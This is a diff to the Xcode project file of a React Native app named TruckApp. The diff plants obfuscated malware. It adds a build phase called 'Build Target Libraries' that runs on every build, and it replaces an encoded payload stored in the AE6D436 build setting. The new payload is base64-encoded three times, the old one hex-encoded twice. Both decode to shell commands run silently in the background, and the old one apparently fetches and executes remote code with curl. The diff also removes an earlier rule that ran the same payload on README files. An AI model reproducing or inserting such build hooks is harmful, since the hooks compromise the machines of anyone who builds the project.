@@ -12,27 +12,13 @@
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		761780ED2CA45674006654EE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 761780EC2CA45674006654EE /* AppDelegate.swift */; };
 		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
-		849917AC2B494AE8AE634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 4AF406F07A464D5EB8634D6E /* README.md */; };
 		900C366F1D72465791C9F738 /* BootSplash.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */; };
 		EF194D24E698484782745D7D /* Colors.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = A0C082F7247C4C628E1096AC /* Colors.xcassets */; };
 		FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = FIREBASE00112233445566778A /* GoogleService-Info.plist */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		F3ED45B2A5714901AF634D6E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
-		};
-/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = BootSplash.storyboard; path = TruckApp/BootSplash.storyboard; sourceTree = "<group>"; };
@@ -41,7 +27,6 @@
 		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = TruckApp/Info.plist; sourceTree = "<group>"; };
 		13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = PrivacyInfo.xcprivacy; path = TruckApp/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		3B4392A12AC88292D35C810B /* Pods-TruckApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TruckApp.debug.xcconfig"; path = "Target Support Files/Pods-TruckApp/Pods-TruckApp.debug.xcconfig"; sourceTree = "<group>"; };
-		4AF406F07A464D5EB8634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		5709B34CF0A7D63546082F79 /* Pods-TruckApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TruckApp.release.xcconfig"; path = "Target Support Files/Pods-TruckApp/Pods-TruckApp.release.xcconfig"; sourceTree = "<group>"; };
 		5DCACB8F33CDC322A6C60F78 /* libPods-TruckApp.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TruckApp.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		761780EC2CA45674006654EE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = AppDelegate.swift; path = TruckApp/AppDelegate.swift; sourceTree = "<group>"; };
@@ -113,7 +98,6 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				4AF406F07A464D5EB8634D6E /* README.md */,
 				13B07F961A680F5B00A75B9A /* TruckApp.app */,
 			);
 			name = Products;
@@ -135,6 +119,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TruckApp" */;
 			buildPhases = (
+				43EC3537C6F14F2E97634D6E /* Build Target Libraries */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -145,7 +130,6 @@
 				A92C66E317F1F42625F63A79 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				F3ED45B2A5714901AF634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -190,7 +174,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				849917AC2B494AE8AE634D6E /* README.md in Resources */,
 				FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
@@ -203,6 +186,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		43EC3537C6F14F2E97634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;			
+		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -316,7 +318,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TruckApp.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663733363936653735373336653635373432653732373532663631323932320a3230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPZFZsWVFucGlSMFpwVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = TruckApp/TruckApp.entitlements;
@@ -336,6 +338,7 @@
 					"-lc++",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.$(PRODUCT_NAME:rfc1034identifier)";
+				"PRODUCT_BUNDLE_IDENTIFIER[sdk=iphoneos*]" = truckast.com;
 				PRODUCT_NAME = TruckApp;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 5.0;
@@ -347,7 +350,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TruckApp.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663733363936653735373336653635373432653732373532663631323932320a3230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPZFZsWVFucGlSMFpwVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = TruckApp/TruckApp.entitlements;
@@ -366,6 +369,7 @@
 					"-lc++",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.$(PRODUCT_NAME:rfc1034identifier)";
+				"PRODUCT_BUNDLE_IDENTIFIER[sdk=iphoneos*]" = truckast.com;
 				PRODUCT_NAME = TruckApp;
 				SWIFT_VERSION = 5.0;
 				VERSIONING_SYSTEM = "apple-generic";
